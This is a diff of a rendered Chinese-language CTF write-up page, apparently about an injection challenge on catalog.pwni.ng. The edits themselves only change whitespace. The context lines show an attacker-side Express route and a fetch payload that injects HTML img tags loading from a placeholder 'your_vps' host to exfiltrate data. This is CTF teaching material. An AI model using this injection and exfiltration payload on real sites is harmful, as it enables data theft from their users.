@@ -316,7 +316,7 @@ CTF
 <span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
     <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;==&gt; Admin was redirected to attacker&#39;s page&#34;</span><span class=p>);</span>
     <span class=nx>res</span><span class=p>.</span><span class=nx>sendFile</span><span class=p>(</span><span class=s2>&#34;index.html&#34;</span><span class=p>,</span> <span class=p>{</span>
-        <span class=nx>root</span><span class=o>:</span> <span class=mi>__</span><span class=nx>dirname</span>
+        <span class=nx>root</span><span class=o>:</span> <span class=nx>__dirname</span>
     <span class=p>});</span>
 <span class=p>});</span>
 
@@ -431,7 +431,7 @@ CTF
 <p>这是因为 fragment 锁的原因，iframe 当中的页面等待在 issue_1 界面等待 fragment 锁的解锁，而当 status 锁解锁，会立马触发 index.html 当中的 fetch 请求</p>
 <div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;http://catalog.pwni.ng/user.php&#34;</span><span class=p>,</span> <span class=p>{</span>
   <span class=s2>&#34;headers&#34;</span><span class=o>:</span> <span class=p>{</span>
-     <span class=s2>&#34;content-type&#34;</span><span class=o>:</span> <span class=s2>&#34;application/x-www-form-urlencoded&#34;</span><span class=p>,</span>
+  	<span class=s2>&#34;content-type&#34;</span><span class=o>:</span> <span class=s2>&#34;application/x-www-form-urlencoded&#34;</span><span class=p>,</span>
   <span class=p>},</span>
   <span class=s2>&#34;body&#34;</span><span class=o>:</span> <span class=sb>`username=&#34;/&gt;&lt;img src=&#34;http://your_vps/injection&#34;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div align=&#34;left&#34;&gt;&lt;img src=&#34;http://your_vps/exfiltrated&#34; loading=&#34;lazy&#34;&gt;&lt;/div&gt;&lt;em&gt;&amp;password=1&amp;action=login`</span><span class=p>,</span>
   <span class=s2>&#34;method&#34;</span><span class=o>:</span> <span class=s2>&#34;POST&#34;</span><span class=p>,</span>
